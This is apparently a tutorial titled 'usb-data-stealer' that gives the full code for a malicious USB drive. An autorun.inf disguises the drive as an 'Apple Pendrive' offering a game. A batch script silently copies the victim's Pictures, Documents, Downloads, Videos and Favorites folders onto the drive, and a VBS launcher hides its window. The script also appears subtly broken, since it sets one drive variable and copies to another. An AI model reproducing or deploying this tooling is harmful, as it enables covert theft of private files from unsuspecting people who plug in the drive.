# usb-data-stealer

<html>
Step 1: Open notepad. <br>
 <br>
[autorun]  <br>
icon=Devicon.ico <br>
label=Apple Pendrive <br>
open=launch.bat <br>
action=Click ok to Run game for Windows <br>
shell\open\command=launch.bat <br>
 <br>
Save As...autorun.inf <br>
 <br>
Step 2: <br>
 <br>
@echo off <br>
:: variables <br>
/min <br>
SET odrive=%odrive:~0,2% <br>
set backupcmd=xcopy /s /c /d /e /h /i /r /y <br>
echo off <br>
%backupcmd% "%USERPROFILE%\pictures" "%drive%\all\My pics" <br>
%backupcmd% "%USERPROFILE%\Favorites" "%drive%\all\Favorites" <br>
%backupcmd% "%USERPROFILE%\videos" "%drive%\all\videos" <br>
%backupcmd% "%USERPROFILE%\Downloads" "%drive%\all\Downloads" <br>
%backupcmd% "%USERPROFILE%\Documents" "%drive%\all\Documents" <br>
@echo off  <br>
cls <br>
 <br>
Save as...file.bat <br>
 <br>
Step 3: <br>
 <br>
CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False <br>
 <br>
Save as...invisible.vbs <br>
 <br>
Step 4:
 <br>
wscript.exe \invisible.vbs file.bat  <br>
 <br>
Save as...launch.bat <br>
 <br>
Step 5: <br>
 <br>
copy all the 4 files to pendrive. <br>
</html>
